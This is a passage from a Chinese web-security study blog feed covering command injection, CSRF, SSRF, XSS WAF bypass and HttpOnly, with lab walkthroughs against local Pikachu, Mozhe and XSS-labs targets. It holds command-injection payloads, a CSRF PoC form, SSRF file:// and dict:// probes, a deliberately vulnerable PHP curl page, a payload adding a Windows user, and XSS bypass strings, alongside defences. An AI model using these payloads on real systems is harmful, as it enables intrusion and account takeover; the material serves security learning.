class="line">&quot;&amp;&quot;：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</span><br><span class="line">&quot;&amp;&amp;&quot;：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执    行,前面的语句只能为真。</span><br></pre></td></tr></table></figure><h4 id="php相关函数"><a href="#php相关函数" class="headerlink" title="php相关函数"></a>php相关函数</h4><ul><li>system(args) 有回显</li><li>passthru(args)(有回显)</li><li>exec(args) （回显最后一行-必须echo输出）</li><li>shell_exec(args) （无回显-必须输出）</li><li>反引号：``</li><li>popen(handle,mode)(无回显)</li><li>proc_open(‘cmd’,‘flag’,‘flag’)（无回显）</li><li>$process = proc_open(‘dir’,$des,$pipes);</li><li>echo stream_get_contents($pipes[1]); </li></ul><h4 id="案例演示-1"><a href="#案例演示-1" class="headerlink" title="案例演示"></a>案例演示</h4><p>墨者命令注入执行分析</p><p>通过抓包绕过前端js检测。使用<code>;</code>进行命令拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;ls&amp;submit=Ping</span><br></pre></td></tr></table></figure><p><img src="https://p.pstatp.com/origin/pgc-image/75a742c9a3a1492d9df791080b8a3a83"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping</span><br></pre></td></tr></table></figure><p>成功获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozhe1af4b8cc599a0a837919be1d30d</span><br></pre></td></tr></table></figure><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/ermei/p/6689005.html</span><br><span class="line"></span><br><span class="line">http://blog.leanote.com/post/snowming/9da184ef24bd</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3</span><br><span class="line">Sm13dz09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGx</span><br><span class="line">aL0JjUT09bW96aGUmozhe</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDd</span><br><span class="line">Xl0Zz09bW96aGUmozhe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 代码执行 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>29WEB漏洞-CSRF及SSRF漏洞案例讲解</title>
      <link href="/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/"/>
      <url>/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118725.png" alt="image-20210912103808280"></p><h4 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h4><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p><h4 id="CSRF可以做什么"><a href="#CSRF可以做什么" class="headerlink" title="CSRF可以做什么"></a>CSRF可以做什么</h4><p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>用户登录一个正常的网站，并且本地生成了自己的Cookie，然后在不关闭该网站的前提下，用户访问了黑客的网站，黑客通过伪造数据包，向正常网站发起请求，从而造成了CSRF攻击。</p><h4 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h4><p>首先我们需要抓取到正常数据包</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118367.png" alt="image-20210912105403233"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&#x27;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=b232oy&amp;phonenum=aaaaaaa&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>使用其他浏览器发送上述代码，需要在前面加上IP地址</p><p>这里我是通过将代码写到html文本里，访问html触发代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118797.png" alt="image-20210912112045072"></p><p>也可以使用burp自动生成csrf代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118748.png" alt="image-20210912112441333"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;23232&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;chain&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vince&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将上述代码写到html文件中，一样可以触发CSRF漏洞。</p><h4 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h4><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机 Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，<br>      黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p><p>如果在测试CSRF中，数据包有token，一般是没有该漏洞的。</p><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><h4 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h4><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118434.png" alt="image-20210912113701370"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118450.png" alt="image-20210912113959313"></p><h4 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h4><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等。</p><h4 id="漏洞存在"><a href="#漏洞存在" class="headerlink" title="漏洞存在"></a>漏洞存在</h4><p>具体可能出现SSRF的地方：</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h4 id="本地上传"><a href="#本地上传" class="headerlink" title="本地上传"></a>本地上传</h4><p>本地上传就是通过将自己本地的资源上传到服务器上</p><h4 id="远程上传"><a href="#远程上传" class="headerlink" title="远程上传"></a>远程上传</h4><p>远程上传就是通过远程地址来上传文件，对方需要请求远程地址。</p><h4 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h4><p>SSRF存在于远程上传或者远程加载的地方，服务器会对我们的远程地址进行请求，如果我们将该服务器的远程访问地址修改为<code>127.0.0.1:端口</code>，那么服务器就会对自己的端口进行探测。</p><h4 id="各个协议调用探针"><a href="#各个协议调用探针" class="headerlink" title="各个协议调用探针"></a>各个协议调用探针</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http,file,dict,ftp,gopher 等</span><br><span class="line">漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.64.144/phpmyadmin/</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://192.168.64.144:3306/info</span><br><span class="line">ftp://192.168.64.144:21</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118240.png" alt="image-20210912115508618"></p><p>这里演示的是file协议，通过该协议可以读取本地文件内容</p><h4 id="不同类型网站支持协议"><a href="#不同类型网站支持协议" class="headerlink" title="不同类型网站支持协议"></a>不同类型网站支持协议</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118259.png" alt="image-20210912120631161"></p><h4 id="SSRF漏洞代码测试"><a href="#SSRF漏洞代码测试" class="headerlink" title="SSRF漏洞代码测试"></a>SSRF漏洞代码测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">请输入图片地址：&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;</span><br><span class="line">&lt;input type=&#x27;submit&#x27; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$img =</span><br><span class="line">file_get_contents(&#x27;http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20t</span><br><span class="line">est1234%201234%20/add.&#125;&#x27;);</span><br><span class="line">echo $url;</span><br><span class="line">echo $img;</span><br><span class="line">//header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);</span><br><span class="line">//echo $img;</span><br><span class="line">//$file=fopen(&#x27;x.png&#x27;,&#x27;w+&#x27;);</span><br><span class="line">//fwrite($file,$img);</span><br><span class="line">//fclose($file);</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$_POST[&#x27;url&#x27;];</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1bp96ECJ</span><br><span class="line">https://www.t00ls.net/articles-41070.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> CSRF </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>28WEB漏洞-XSS跨站之WAF绕过及安全修复</title>
      <link href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
      <url>/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="常规-WAF-绕过思路"><a href="#常规-WAF-绕过思路" class="headerlink" title="常规 WAF 绕过思路"></a>常规 WAF 绕过思路</h3><ul><li><p>标签语法替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 a标签、img标签来替换script</span><br></pre></td></tr></table></figure></li><li><p>特殊符号干扰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#@!%&amp;/等等,特殊符号进行干扰</span><br></pre></td></tr></table></figure></li><li><p>提交方式更改 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过POST、GET方式进行绕过提交</span><br></pre></td></tr></table></figure></li><li><p>垃圾数据溢出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在&lt;script&gt;alert(1)asjkhdsajkhdjakh&lt;/script&gt;像这样就是垃圾数据</span><br></pre></td></tr></table></figure></li><li><p>加密解密算法 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过将XSS语句加密绕过</span><br></pre></td></tr></table></figure></li><li><p>结合其他漏洞绕过</p></li></ul><h3 id="XSStrike工具"><a href="#XSStrike工具" class="headerlink" title="XSStrike工具"></a>XSStrike工具</h3><h4 id="XSStrike-主要特点"><a href="#XSStrike-主要特点" class="headerlink" title="XSStrike 主要特点"></a>XSStrike 主要特点</h4><ul><li>反射和 DOM XSS 扫描 </li><li>多线程爬虫</li><li>Context分析 </li><li>可配置的核心 </li><li>检测和规避WAF </li><li>老旧的 JS 库扫描 </li><li>智能 payload 生成器 </li><li>手工制作的 HTML &amp; JavaScript解析器 </li><li>强大的 fuzzing引擎 </li><li>盲打 XSS 支持</li><li>高效的工作流 </li><li>完整的 HTTP支持</li><li>Bruteforce payloads 支持</li><li>Payload 编码</li></ul><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><h3 id="安全修复方案"><a href="#安全修复方案" class="headerlink" title="安全修复方案"></a>安全修复方案</h3><ul><li>开启 httponly,输入过滤，输出过滤等 </li><li>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a> </li><li>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></li></ul><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><ul><li><a href="https://gitee.com/yhtmxl/imxss/">https://gitee.com/yhtmxl/imxss/</a> </li><li><a href="https://github.com/3xp10it/xwaf">https://github.com/3xp10it/xwaf</a> </li><li><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a> </li><li><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a> </li><li><a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a> </li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> XSS跨站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27WEB漏洞-XSS跨站之代码及httponly绕过</title>
      <link href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="HTTPOnly"><a href="#HTTPOnly" class="headerlink" title="HTTPOnly"></a>HTTPOnly</h3><h4 id="什么是HTTPOnly？"><a href="#什么是HTTPOnly？" class="headerlink" title="什么是HTTPOnly？"></a>什么是HTTPOnly？</h4><p>如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击(攻击手法)，具体一点的介绍请google进行搜索</p><h4 id="开启HTTPOnly"><a href="#开启HTTPOnly" class="headerlink" title="开启HTTPOnly"></a>开启HTTPOnly</h4><p>这里只介绍PHP如何开启。</p><p>PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure><p>设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br><span class="line">// or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure><p>对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>防止XSS读取cookie信息</p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>将代码写入文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117200.png" alt="image-20210908203702609"></p><p>当我们是用XSS语句进行盗取Cookie时，这里直接将XSS代码写到代码中。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117894.png" alt="image-20210908203857028"></p><p>然后去查看XSS平台，可以看到Cookie没有被返回</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117074.png" alt="image-20210908203952045"></p><h4 id="绕过HttpOnly"><a href="#绕过HttpOnly" class="headerlink" title="绕过HttpOnly"></a>绕过HttpOnly</h4><p>开启HttpOnly只会防止我们读取Cookie，而不会使我们XSS语句失效。如果对方开启了HttpOnly。除了可以通过获取Cookie来进行登录，还有一种方法就是通过账号和密码进行登录。</p><p><strong>保存读取</strong></p><p>如果对方在进行账号密码登录后，进行了浏览器保存。我们就可以利用XSS进行浏览器账号密码读取。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117574.png" alt="image-20210908204924604" style="zoom:67%;" /><p><strong>未保存读取</strong></p><p>如果对方在进行账号密码登录后，没有进行浏览器保存。我们可以采用表单劫持的方式，将对方输入的账号密码，发送一份给我们。这个攻击有一个前提条件，登录页面必须要有XSS漏洞。</p><h3 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>查看代码发现。</p><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><strong>PHP htmlspecialchars() 函数</strong></p><p>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br></pre></td></tr></table></figure><h5 id="显示结果"><a href="#显示结果" class="headerlink" title="显示结果"></a>显示结果</h5><p>将&lt;&gt;替换成了<code>&amp;lt;</code>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=&quot;center&quot;&gt;没有找到和&amp;lt;script&amp;gt;alet(1)&amp;lt;script&amp;gt;相关的结果.&lt;/h2&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117116.png" alt="image-20210908211617873" style="zoom:67%;" /><p>我们发现下面一个标签中还有一个我们写的js语句，我们可以在前面写上”&gt;闭合前面的，就可以执行XSS代码了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>除了&lt;&gt;被过滤掉以后，”也被过滤掉了。我们在输入和第二关一样的代码时，双引号被代码实例化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><h5 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h5><p><strong>HTML onclick 事件属性</strong></p><p>当点击按钮时执行一段 JavaScript：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;copyText()&quot;&gt;Copy Text&lt;/button&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=&#x27;javascript:alert(/xss/)                  #onfocus聚焦事件</span><br><span class="line">&#x27; onfocus=&#x27;alert(/xss/) </span><br></pre></td></tr></table></figure><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>和第3关一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; 